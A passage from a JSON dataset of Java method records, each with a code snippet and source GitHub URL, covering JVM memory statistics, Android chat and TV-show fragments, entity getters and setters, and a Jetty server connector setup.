[], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTotalString() {\n            StringBuilder sb = new StringBuilder();\n            sb.append(\"\\n\\t [total gc info] => \\n\");\n            sb.append(\"\\t\\t \");\n            sb.append(String.format(\"%-20s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s \\n\", \"NAME\", \"totalGCCount\", \"maxDeltaGCCount\", \"minDeltaGCCount\", \"totalGCTime\", \"maxDeltaGCTime\", \"minDeltaGCTime\"));\n            for (GCStatus gc : gcStatusMap.values()) {\n                sb.append(\"\\t\\t \");\n                sb.append(String.format(\"%-20s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s \\n\",\n                        gc.name, gc.totalGCCount, gc.maxDeltaGCCount, gc.minDeltaGCCount,\n                        String.format(\"%,.3fs\", (float) gc.totalGCTime / 1000),\n                        String.format(\"%,.3fs\", (float) gc.maxDeltaGCTime / 1000),\n                        String.format(\"%,.3fs\", (float) gc.minDeltaGCTime / 1000)));\n\n            }\n            return sb.toString();\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31871, "method_name": "toString", "class_name": "ProcessMemoryStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String toString() {\n            StringBuilder sb = new StringBuilder();\n            sb.append(\"\\t\");\n            sb.append(String.format(\"%-30s | %-30s | %-30s \\n\", \"MEMORY_NAME\", \"allocation_size\", \"init_size\"));\n            for (MemoryStatus ms : memoryStatusMap.values()) {\n                sb.append(\"\\t\");\n                sb.append(String.format(\"%-30s | %-30s | %-30s \\n\",\n                        ms.name, String.format(\"%,.2fMB\", (float) ms.maxSize / MB), String.format(\"%,.2fMB\", (float) ms.initSize / MB)));\n            }\n            return sb.toString();\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31872, "method_name": "getDeltaString", "class_name": "ProcessMemoryStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getDeltaString() {\n            StringBuilder sb = new StringBuilder();\n            sb.append(\"\\n\\t [delta memory info] => \\n\");\n            sb.append(\"\\t\\t \");\n            sb.append(String.format(\"%-30s | %-30s | %-30s | %-30s | %-30s \\n\", \"NAME\", \"used_size\", \"used_percent\", \"max_used_size\", \"max_percent\"));\n            for (MemoryStatus ms : memoryStatusMap.values()) {\n                sb.append(\"\\t\\t \");\n                sb.append(String.format(\"%-30s | %-30s | %-30s | %-30s | %-30s \\n\",\n                        ms.name, String.format(\"%,.2f\", (float) ms.usedSize / MB) + \"MB\",\n                        String.format(\"%,.2f\", (float) ms.percent) + \"%\",\n                        String.format(\"%,.2f\", (float) ms.maxUsedSize / MB) + \"MB\",\n                        String.format(\"%,.2f\", (float) ms.maxpercent) + \"%\"));\n\n            }\n            return sb.toString();\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31873, "method_name": "setCurTotalGcCount", "class_name": "GCStatus", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setCurTotalGcCount(long curTotalGcCount) {\n            this.curDeltaGCCount = curTotalGcCount - totalGCCount;\n            this.totalGCCount = curTotalGcCount;\n\n            if (maxDeltaGCCount < curDeltaGCCount) {\n                maxDeltaGCCount = curDeltaGCCount;\n            }\n\n            if (minDeltaGCCount == -1 || minDeltaGCCount > curDeltaGCCount) {\n                minDeltaGCCount = curDeltaGCCount;\n            }\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31874, "method_name": "setCurTotalGcTime", "class_name": "GCStatus", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setCurTotalGcTime(long curTotalGcTime) {\n            this.curDeltaGCTime = curTotalGcTime - totalGCTime;\n            this.totalGCTime = curTotalGcTime;\n\n            if (maxDeltaGCTime < curDeltaGCTime) {\n                maxDeltaGCTime = curDeltaGCTime;\n            }\n\n            if (minDeltaGCTime == -1 || minDeltaGCTime > curDeltaGCTime) {\n                minDeltaGCTime = curDeltaGCTime;\n            }\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31875, "method_name": "setMaxMinUsedSize", "class_name": "MemoryStatus", "params": ["long"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "        void setMaxMinUsedSize(long curUsedSize) {\n            if (maxUsedSize < curUsedSize) {\n                maxUsedSize = curUsedSize;\n            }\n            this.usedSize = curUsedSize;\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31876, "method_name": "setMaxMinPercent", "class_name": "MemoryStatus", "params": ["float"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "        void setMaxMinPercent(float curPercent) {\n            if (maxpercent < curPercent) {\n                maxpercent = curPercent;\n            }\n            this.percent = curPercent;\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31877, "method_name": "onCreateView", "class_name": "DealRoomFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        super.onCreateView(inflater, container, savedInstanceState);\n        View mRootView = inflater.inflate(R.layout.fragment_deal_room, null);\n        Toolbar toolbar = mRootView.findViewById(R.id.toolbar);\n        mToolbarTitle = mRootView.findViewById(R.id.toolbar_title);\n        mToolbarRight = mRootView.findViewById(R.id.toolbar_right);\n        toolbar.setTitle(\"\");\n        mToolbarTitle.setText(\"UID:\" + Constant.uid);\n        mToolbarRight.setOnClickListener(this::onClick);\n        etLoginRoomid = mRootView.findViewById(R.id.et_roomid);\n        etBtnJoinRoom = mRootView.findViewById(R.id.btn_join_room);\n        etBtnCreateRoom = mRootView.findViewById(R.id.btn_create_room);\n        tvAppVersion = mRootView.findViewById(R.id.tv_app_version);\n\n        etLoginRoomid.setOnClickListener(this::onClick);\n        etBtnJoinRoom.setOnClickListener(this::onClick);\n        etBtnCreateRoom.setOnClickListener(this::onClick);\n        tvAppVersion.setText(getString(R.string.app_version, BuildConfig.VERSION_NAME));\n        EditTextUtil.checkRoomIdEditTextChanged(etLoginRoomid, etBtnJoinRoom);\n        FacadeRtcManager.getInstance().setJoinThunderRoomObserver(observer);\n        return mRootView;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/ui/DealRoomFragment.java", "stars": "2", "class_props": {"extends": "BaseFragment", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31878, "method_name": "onHiddenChanged", "class_name": "DealRoomFragment", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onHiddenChanged(boolean hidden) {\n        super.onHiddenChanged(hidden);\n        if (!hidden && mToolbarTitle!=null) {\n            mToolbarTitle.setText(\"UID:\" + Constant.uid);\n        }\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/ui/DealRoomFragment.java", "stars": "2", "class_props": {"extends": "BaseFragment", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31879, "method_name": "onClick", "class_name": "DealRoomFragment", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View view) {\n        switch (view.getId()) {\n            case R.id.toolbar_right:\n                logout();\n                break;\n            case R.id.btn_join_room:\n                showDialogProgress();\n                roomId = etLoginRoomid.getText().toString();\n                joinChatroom();\n                break;\n            case R.id.btn_create_room:\n                createRoom();\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/ui/DealRoomFragment.java", "stars": "2", "class_props": {"extends": "BaseFragment", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31880, "method_name": "createRoom", "class_name": "DealRoomFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createRoom() {\n        showDialogProgress();\n        HMR.getService(ChatRoomService.class).createChatRoom(new ChatRoomInfo(\"\u968f\u673a\u6d4b\u8bd5\", \"\u968f\u673a\u6d4b\u8bd5\", null, null), new HMR.CompletionArg<ChatRoom>() {\n            @Override\n            public void onSuccess(ChatRoom result) {\n                roomId = Long.toString(result.getId());\n                joinChatroom();\n            }\n\n            @Override\n            public void onFailed(Error error) {\n                dissMissDialogProgress();\n                if (error.code == Error.Code.NetworkNotFound) {\n                    Toast.makeText(getActivity(), \"\u7f51\u7edc\u65e0\u6cd5\u8fde\u63a5\", Toast.LENGTH_SHORT).show();\n                } else {\n                    Toast.makeText(getActivity(), \"\u521b\u5efa\u623f\u95f4\u5931\u8d25\", Toast.LENGTH_SHORT).show();\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/ui/DealRoomFragment.java", "stars": "2", "class_props": {"extends": "BaseFragment", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31881, "method_name": "logout", "class_name": "DealRoomFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void logout() {\n        showDialogProgress();\n        HMR.getService(MQService.class)\n                .removeSource(new Source(new Source.Shared(Constant.CHAT_GROUPID, null)));\n        HMR.close(new HMR.Completion() {\n            @Override\n            public void onSuccess() {\n                dissMissDialogProgress();\n                Utils.setIsLogin(getActivity(),false);\n                ((MainActivity) getActivity()).showFragment(MainActivity.SHOW_LOGINFRAGMENT);\n            }\n\n            @Override\n            public void onFailed(Error err) {\n                dissMissDialogProgress();\n                Toast.makeText(getActivity(), \"\u9000\u51fa\u767b\u5f55\u5931\u8d25\", Toast.LENGTH_SHORT).show();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/ui/DealRoomFragment.java", "stars": "2", "class_props": {"extends": "BaseFragment", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31882, "method_name": "joinChatroom", "class_name": "DealRoomFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void joinChatroom() {\n        HMR.getService(ChatRoomService.class).join(new ChatRoom(Long.parseLong(roomId)), new HashMap<>(16), new Challenges.JoiningCompletion() {\n            @Override\n            public void onReceiveChallenge(Challenges.Password challenge) {\n            }\n\n            @Override\n            public void onReceiveChallenge(Challenges.AppChallenge challenge) {\n            }\n\n            @Override\n            public void onSucceed() {\n                localLiveRoomId = roomId + HMR.getMe().getId();\n//                ThunderEngine.setLogLevel(ThunderRtcConstant.ThunderLogLevel.THUNDERLOG_LEVEL_ERROR);\n                FacadeRtcManager.getInstance().setRoomConfig(ThunderRtcConstant.ThunderRtcProfile.THUNDER_PROFILE_DEFAULT, ThunderRtcConstant.RoomConfig.THUNDER_ROOMCONFIG_LIVE);\n                FacadeRtcManager.getInstance().joinRoom(Constant.token, localLiveRoomId, String.valueOf(HMR.getMe().getId()));\n            }\n\n            @Override\n            public void onFailure(@NonNull Error err) {\n                dissMissDialogProgress();\n                if (err.code == Error.Code.ResourceNotFound) {\n                    Toast.makeText(getActivity(), \"\u623f\u95f4\u4e0d\u5b58\u5728\", Toast.LENGTH_SHORT).show();\n                } else if (err.code == Error.Code.NetworkNotFound) {\n                    Toast.makeText(getActivity(), \"\u7f51\u7edc\u65e0\u6cd5\u8fde\u63a5\", Toast.LENGTH_SHORT).show();\n                } else {\n                    Toast.makeText(getActivity(), \"\u52a0\u5165\u623f\u95f4\u5931\u8d25\", Toast.LENGTH_SHORT).show();\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/ui/DealRoomFragment.java", "stars": "2", "class_props": {"extends": "BaseFragment", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31883, "method_name": "newInstance", "class_name": "DealRoomFragment", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DealRoomFragment", "snippet": "    public static DealRoomFragment newInstance() {\n        return new DealRoomFragment();\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/ui/DealRoomFragment.java", "stars": "2", "class_props": {"extends": "BaseFragment", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31884, "method_name": "getId", "class_name": "ProdutoTabela", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ProdutoTabelaKey", "snippet": "    public ProdutoTabelaKey getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/domain/ProdutoTabela.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 31885, "method_name": "setId", "class_name": "ProdutoTabela", "params": ["ProdutoTabelaKey"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(ProdutoTabelaKey id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/domain/ProdutoTabela.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 31886, "method_name": "getTabela", "class_name": "ProdutoTabela", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Tabela", "snippet": "    public Tabela getTabela() {\n        return tabela;\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/domain/ProdutoTabela.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 31887, "method_name": "setTabela", "class_name": "ProdutoTabela", "params": ["Tabela"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTabela(Tabela tabela) {\n        this.tabela = tabela;\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/domain/ProdutoTabela.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 31888, "method_name": "getProduto", "class_name": "ProdutoTabela", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Produto", "snippet": "    public Produto getProduto() {\n        return produto;\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/domain/ProdutoTabela.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 31889, "method_name": "setProduto", "class_name": "ProdutoTabela", "params": ["Produto"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProduto(Produto produto) {\n        this.produto = produto;\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/domain/ProdutoTabela.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 31890, "method_name": "newInstance", "class_name": "TVShowDetailsFragment", "params": ["Media"], "throws": null, "modifiers": ["public", "static"], "return_type": "Fragment", "snippet": "    public static Fragment newInstance(Media media) {\n        TVShowDetailsFragment fragment = new TVShowDetailsFragment();\n\n        Bundle bundle = new Bundle();\n        bundle.putParcelable(EXTRA_ITEM, media);\n\n        fragment.setArguments(bundle);\n        return fragment;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31891, "method_name": "onCreate", "class_name": "TVShowDetailsFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        TVButterApplication.getAppContext()\n                .getComponent()\n                .inject(this);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31892, "method_name": "loadDetails", "class_name": "TVShowDetailsFragment", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void loadDetails() {\n        ArrayList<Media> mediaList = new ArrayList<>();\n        mediaList.add(getShowItem());\n\n        providerManager.getCurrentMediaProvider().getDetail(mediaList, 0, this);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31893, "method_name": "getDetailPresenter", "class_name": "TVShowDetailsFragment", "params": [], "throws": null, "modifiers": [], "return_type": "AbstractDetailsDescriptionPresenter", "snippet": "    AbstractDetailsDescriptionPresenter getDetailPresenter() {\n        return new ShowDetailsDescriptionPresenter();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31894, "method_name": "onDetailLoaded", "class_name": "TVShowDetailsFragment", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void onDetailLoaded() {\n        updateShowsAdapterContent();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31895, "method_name": "createPresenters", "class_name": "TVShowDetailsFragment", "params": ["ClassPresenterSelector"], "throws": null, "modifiers": [], "return_type": "ClassPresenterSelector", "snippet": "    ClassPresenterSelector createPresenters(ClassPresenterSelector selector) {\n        selector.addClassPresenter(DetailsOverviewRow.class, new EpisodeCardPresenter(getActivity()));\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31896, "method_name": "addActions", "class_name": "TVShowDetailsFragment", "params": ["Media"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void addActions(Media item) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31897, "method_name": "createAdapter", "class_name": "TVShowDetailsFragment", "params": ["PresenterSelector"], "throws": null, "modifiers": ["protected"], "return_type": "ArrayObjectAdapter", "snippet": "    protected ArrayObjectAdapter createAdapter(PresenterSelector selector) {\n        return new ArrayObjectAdapter(selector);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31898, "method_name": "onActionClicked", "class_name": "TVShowDetailsFragment", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActionClicked(Action action) {\n        //no actions yet\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31899, "method_name": "onEpisodeClicked", "class_name": "TVShowDetailsFragment", "params": ["Episode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEpisodeClicked(Episode episode) {\n        if (null == episode) {\n            return;\n        }\n\n        // start first torrent\n        if (episode.torrents.size() == 1) {\n            List<Map.Entry<String, Media.Torrent>> torrents = new ArrayList<>(episode.torrents.entrySet());\n            onTorrentSelected(episode, torrents.get(0));\n        }\n        // ask user which torrent\n        else {\n            showTorrentsDialog(episode, episode.torrents);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31900, "method_name": "updateShowsAdapterContent", "class_name": "TVShowDetailsFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updateShowsAdapterContent() {\n        final TreeMap<Integer, List<Episode>> seasons = new TreeMap<>(new Comparator<Integer>() {\n            @Override\n            public int compare(Integer me, Integer other) {\n                return me - other;\n            }\n        });\n\n        for (Episode episode : getShowItem().episodes) {\n            // create list of season if does not exists\n            if (!seasons.containsKey(episode.season)) {\n                seasons.put(episode.season, new ArrayList<Episode>());\n            }\n\n            // add episode to the list\n            final List<Episode> seasonEpisodes = seasons.get(episode.season);\n            seasonEpisodes.add(episode);\n        }\n\n        ArrayObjectAdapter objectAdapter = getObjectArrayAdapter();\n\n        for (Integer seasonKey : seasons.descendingKeySet()) {\n            Collections.sort(seasons.get(seasonKey), new Comparator<Episode>() {\n                @Override\n                public int compare(Episode me, Episode other) {\n                    if (me.episode < other.episode) return -1;\n                    else if (me.episode > other.episode) return 1;\n                    return 0;\n                }\n            });\n\n            EpisodeCardPresenter presenter = new EpisodeCardPresenter(getActivity());\n            presenter.setOnClickListener(this);\n            ArrayObjectAdapter episodes = new ArrayObjectAdapter(presenter);\n\n            for (Episode episode : seasons.get(seasonKey)) {\n                episodes.add(episode);\n            }\n            HeaderItem header = new HeaderItem(seasonKey, String.format(\"Season %d\", seasonKey));\n            objectAdapter.add(new ListRow(header, episodes));\n        }\n\n        objectAdapter.notifyArrayItemRangeChanged(0, objectAdapter.size());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31901, "method_name": "getShowItem", "class_name": "TVShowDetailsFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Show", "snippet": "    private Show getShowItem() {\n        return (Show) getMediaItem();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31902, "method_name": "showTorrentsDialog", "class_name": "TVShowDetailsFragment", "params": ["Episode", "Map<String,Media>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showTorrentsDialog(final Episode episode, final Map<String, Media.Torrent> torrents) {\n        ArrayList<String> choices = new ArrayList<>(torrents.keySet());\n        final ArrayList torrent = new ArrayList(torrents.entrySet());\n        new AlertDialog.Builder(getActivity())\n                .setTitle(getString(R.string.choose_quality))\n                .setSingleChoiceItems(choices.toArray(new CharSequence[choices.size()]), 0, new DialogInterface.OnClickListener() {\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        onTorrentSelected(episode, (Map.Entry<String, Media.Torrent>) torrent.get(which));\n                        dialog.dismiss();\n                    }\n                }).show();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31903, "method_name": "onTorrentSelected", "class_name": "TVShowDetailsFragment", "params": ["Episode", "Map"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onTorrentSelected(Episode episode, Map.Entry<String, Media.Torrent> torrent) {\n        String subtitleLanguage = PrefUtils.get(\n            getActivity(),\n            Prefs.SUBTITLE_DEFAULT,\n            SubsProvider.SUBTITLE_LANGUAGE_NONE);\n\n        Show show = getShowItem();\n\n        StreamInfo info = new StreamInfo(\n                episode,\n                show,\n                torrent.getValue().getUrl(),\n                subtitleLanguage,\n                torrent.getKey());\n\n        TVStreamLoadingActivity.startActivity(getActivity(), info, show);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/fragments/TVShowDetailsFragment.java", "stars": "4", "class_props": {"extends": "TVBaseDetailsFragment", "implements": ["MediaProvider", "OnActionClickedListener", "EpisodeCardPresenter"], "modifiers": ["public"]}}, {"id": 31904, "method_name": "get", "class_name": "WebServerProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Server", "snippet": "  public Server get() {\n    requireNonNull(this.props);\n\n    final ServerConnector httpConnector;\n    final ServerConnector httpsConnector;\n\n    final int maxThreads = this.props\n        .getInt(\"jetty.maxThreads\", Constants.DEFAULT_JETTY_MAX_THREAD_COUNT);\n    final QueuedThreadPool httpThreadPool = new QueuedThreadPool(maxThreads);\n\n    final Server server = new Server(httpThreadPool);\n\n    final boolean useSsl = this.props.getBoolean(\"jetty.use.ssl\", true);\n    final int port;\n\n    if (useSsl) {\n      final int sslPortNumber = this.props\n          .getInt(\"jetty.ssl.port\", Constants.DEFAULT_SSL_PORT_NUMBER);\n      port = sslPortNumber;\n      //server.addConnector(getSslSocketConnector(sslPortNumber));\n      // FIXME\u00a0Use https connector.\n      httpsConnector = createHttpsConnector(server);\n      server.addConnector(httpsConnector);\n\n\n    } else {\n      port = this.props.getInt(\"jetty.port\", Constants.DEFAULT_PORT_NUMBER);\n  //      server.addConnector(getSocketConnector(port));\n      // FIXME\u00a0Use http connector.\n      httpConnector = createHttpConnector(server);\n      server.addConnector(httpConnector);\n    }\n\n    logger.info(String.format(\n        \"Starting %sserver on port: %d # Max threads: %d\", useSsl ? \"SSL \" : \"\", port, maxThreads));\n    return server;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebServerProvider.java", "stars": "18", "class_props": {"extends": null, "implements": ["Provider"], "modifiers": ["public"]}}, {"id": 31905, "method_name": "createHttpConnector", "class_name": "WebServerProvider", "params": ["Server"], "throws": null, "modifiers": ["private"], "return_type": "ServerConnector", "snippet": "  private ServerConnector createHttpConnector(Server server) {\n\n    HttpConfiguration httpConfig = new HttpConfiguration();\n    setHeaderBufferSize(httpConfig);\n\n    int port = this.props.getInt(\"jetty.port\", Constants.DEFAULT_PORT_NUMBER);\n    String bindAddress = this.props.getString(\"jetty.hostname\", \"0.0.0.0\");\n\n    ServerConnector connector = createServerConnector(server, port,\n        new HttpConnectionFactory(httpConfig));\n    connector.setHost(bindAddress);\n    return connector;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebServerProvider.java", "stars": "18", "class_props": {"extends": null, "implements": ["Provider"], "modifiers": ["public"]}}, {"id": 31906, "method_name": "createServerConnector", "class_name": "WebServerProvider", "params": ["Server", "int", "ConnectionFactory"], "throws": null, "modifiers": ["private"], "return_type": "ServerConnector", "snippet": "  private ServerConnector createServerConnector(Server server, int port,\n      ConnectionFactory... connectionFactories) {\n    int acceptors = 2;\n    ServerConnector connector = new ServerConnector(server, null,\n        null, null, acceptors, 2, connectionFactories);\n    connector.setPort(port);\n\n    connector.setStopTimeout(0);\n    connector.getSelectorManager().setStopTimeout(0);\n    connector.setIdleTimeout(1200000L);\n\n    setJettySettings(connector);\n\n    return connector;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebServerProvider.java", "stars": "18", "class_props": 